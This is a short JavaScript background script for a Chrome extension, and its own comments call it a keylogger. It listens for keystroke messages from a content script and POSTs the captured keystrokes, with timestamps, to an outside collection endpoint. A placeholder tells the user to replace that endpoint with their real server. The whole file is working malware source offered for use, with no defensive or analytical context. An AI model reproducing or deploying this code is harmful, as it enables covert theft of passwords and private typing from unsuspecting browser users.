// KeyLogger Background Script
// This script receives keystrokes from content script and exfiltrates them.

// Configuration: Replace with your actual exfiltration endpoint
const EXFILTRATION_ENDPOINT = "https://your-dashboard-url.com/collect";

// Listen for messages from content script
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.type === 'keystrokes') {
    // Exfiltrate the keystrokes
    exfiltrateData({
      type: 'keystrokes',
      data: request.data,
      timestamp: request.timestamp
    });
  }
});

// Function to send data to the exfiltration endpoint
function exfiltrateData(data) {
  fetch(EXFILTRATION_ENDPOINT, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  }).catch(err => {
    console.error('Failed to exfiltrate keystrokes:', err);
  });
}
